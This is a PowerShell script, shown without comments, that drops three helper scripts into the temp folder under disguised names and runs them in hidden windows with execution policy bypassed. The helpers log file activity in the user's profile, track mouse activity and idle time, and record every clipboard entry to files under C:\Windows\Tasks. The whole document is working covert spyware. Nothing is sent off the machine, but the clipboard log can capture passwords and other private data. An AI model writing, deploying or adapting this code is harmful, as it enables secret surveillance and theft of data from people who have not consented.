$job1 = @'

$outpath = "C:\Windows\Tasks\info.txt"

$watcher = New-Object System.IO.FileSystemWatcher -Property @{
    Path = "$env:USERPROFILE"
}
$watcher.NotifyFilter = [System.IO.NotifyFilters]::FileName -bor `
                        [System.IO.NotifyFilters]::LastWrite -bor `
                        [System.IO.NotifyFilters]::DirectoryName

$action = {
    $event = $EventArgs
    $path = $event.FullPath
    $changeType = $event.ChangeType
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "[$timestamp] : File $changeType > $path" | Out-File -FilePath $outpath -Encoding ASCII -Append
}

Register-ObjectEvent -InputObject $watcher -EventName Created -Action $action
Register-ObjectEvent -InputObject $watcher -EventName Deleted -Action $action
Register-ObjectEvent -InputObject $watcher -EventName Changed -Action $action

$watcher.EnableRaisingEvents = $true

while ($true) {
    Get-Content -path "C:\Windows\Tasks\info.txt" -raw
    Start-Sleep -Milliseconds 500
}

Unregister-Event -InputObject $watcher -EventName Created -Action $action
Unregister-Event -InputObject $watcher -EventName Deleted -Action $action
Unregister-Event -InputObject $watcher -EventName Changed -Action $action

'@


$job2_1 = @'

$signature = @'
[DllImport("user32.dll")]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool GetCursorPos(out POINT lpPoint);

[StructLayout(LayoutKind.Sequential)]
public struct POINT
{
    public int X;
    public int Y;
}


'@


$job2_2 = @'

$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$outpath = "C:\Windows\Tasks\info.txt"
$cursorType = Add-Type -MemberDefinition $signature -Name "CursorPos" -Namespace "Win32" -PassThru
$prevX = 0
$idleThreshold = New-TimeSpan -Seconds 300
$lastActivityTime = [System.DateTime]::Now
$isActive = $true
$iActive = $true
sleep 1

while ($true) {
    $cursorPos = New-Object Win32.CursorPos+POINT
    [Win32.CursorPos]::GetCursorPos([ref]$cursorPos) | Out-Null
    $currentX = $cursorPos.X
    $currentTime = [System.DateTime]::Now

    if ($currentX -ne $prevX) {
        if ($iActive) {
        $prevX = $currentX
        $lastActivityTime = $currentTime
        
        if ($idleTime -lt $idleThreshold) {
        "[$timestamp] : Mouse is active" | Out-File -FilePath $outpath -Encoding ASCII -Append
        }
        $iActive = $false
    }
}
else {
        $iActive = $true
    }


    $idleTime = $currentTime - $lastActivityTime

    if ($idleTime -ge $idleThreshold) {
        if ($isActive) {
            "[$timestamp] : Mouse has been inactive for 5 Mins" | Out-File -FilePath $outpath -Encoding ASCII -Append
            $isActive = $false
            $iActive = $true
        }
        else {
        }
    }
    else {
        $isActive = $true
    }
    Start-Sleep -Milliseconds 60
}

'@


$job3 = @'

$filePath = "C:\Windows\Tasks\clipboardinfo.txt"
$previousClipboardContent = ""
$previousAppendedClipboardContent = ""
while ($true) {
    $clipboard = Get-Clipboard
    if ($clipboard -ne $previousClipboardContent) {
        if ($clipboard -ne $previousAppendedClipboardContent) {
            "`nNEW CLIBOARD ENTRY `n------------------------------------------------------------" | Out-File -FilePath $filePath -Append
            $clipboard | Out-File -FilePath $filePath -Append
            "-----------------------------------------------------------" | Out-File -FilePath $filePath -Append
            $previousAppendedClipboardContent = $clipboard
        }

        $previousClipboardContent = $clipboard
    }

Start-Sleep -Seconds 5
}

'@



$job1 | Out-File -FilePath "$env:temp\x64_1.ps1" -Force
Start-Sleep 1
$job2_1 | Out-File -FilePath "$env:temp\x64_2.ps1" -Force
Start-Sleep 1
Add-Content $env:temp\x64_2.ps1 "'@ `n" -Force 
sleep 1
$job2_2 | Out-File -FilePath "$env:temp\x64_2.ps1" -Force -Append
sleep 1
$job3 | Out-File -FilePath "$env:temp\x64_3.ps1" -Force
Start-Sleep 1

Start-Process PowerShell.exe -ArgumentList (" -ExecutionPolicy Bypass -w hidden -File `"$env:temp\x64_1.ps1`"")
Start-Sleep 1
Start-Process PowerShell.exe -ArgumentList (" -ExecutionPolicy Bypass -w hidden -File `"$env:temp\x64_2.ps1`"")
Start-Sleep 1
Start-Process PowerShell.exe -ArgumentList (" -ExecutionPolicy Bypass -w hidden -File `"$env:temp\x64_3.ps1`"")
Start-Sleep 1

